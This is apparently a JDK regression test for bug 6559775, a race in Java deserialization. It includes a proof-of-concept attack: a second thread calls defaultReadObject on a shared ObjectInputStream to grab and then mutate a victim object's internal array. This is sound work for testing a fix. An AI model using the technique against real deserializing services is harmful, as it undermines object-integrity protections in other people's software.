/*
 * @test %W% %E%
 * @bug 6559775
 * @summary  Race allows defaultReadObject to be invoked instead of readFields during deserialization
 * @run shell Test6559775.sh
*/

import java.io.*;

public class SerialRace {
    public static void main(String[] args) throws Exception {
        System.err.println(
            "Available processors: "+
            Runtime.getRuntime().availableProcessors()
        );

        final int perStream = 10000;

        // Construct attack data.
        ByteArrayOutputStream byteOut = new ByteArrayOutputStream();
        {
            ObjectOutputStream out = new ObjectOutputStream(byteOut);
            char[] value = new char[] { '?' };
            out.writeObject(value);
            for (int i=0; i<perStream; ++i) {
                SerialVictim orig = new SerialVictim(value);
                out.writeObject(orig);
            }
            out.flush();
        }
        byte[] data = byteOut.toByteArray();

        ByteArrayInputStream byteIn = new ByteArrayInputStream(data);
        final ObjectInputStream in = new ObjectInputStream(byteIn);
        final char[] value = (char[])in.readObject();
        Thread thread = new Thread(new Runnable() { public void run() {
                    for (;;) {
                        try {
                            // Attempt to interlope on other thread.
                            in.defaultReadObject();
                            // Got it.

                            // Let other thread reach known state.
                            Thread.sleep(1000);
                            // This is the reference usually
                            //   read in extended data.
                            SerialVictim victim = (SerialVictim)
                                in.readObject();
                            System.err.println("Victim: "+victim);
                            value[0] = '$';
                            System.err.println("Victim: "+victim);
                            return;
                        } catch (java.io.NotActiveException exc) {
                            // Not ready yet...
                        } catch (java.lang.InterruptedException exc) {
                            throw new Error(exc);
                        } catch (IOException exc) {
                            throw new Error(exc);
                        } catch (ClassNotFoundException exc) {
                            throw new Error(exc);
                        }
                    }
        }});
        thread.start();
        Thread.yield();
        // Normal reading from object stream.
        // We hope the other thread catches us out between
        //   setting up the call to SerialVictim.readObject and
        //   the AtomicBoolean acquisition in readFields.
        for (int i=0; i<perStream; ++i) {
            try {
                SerialVictim victim = (SerialVictim)in.readObject();
            } catch (Exception exc) {
                synchronized (System.err) {
                    System.err.println("Iteration "+i);
                    exc.printStackTrace();
                }
                // Allow atack thread to do it's business before close.
                Thread.sleep(2000);
                break;
            }
        }
        // Stop the other thread.
        in.close();
    }
}
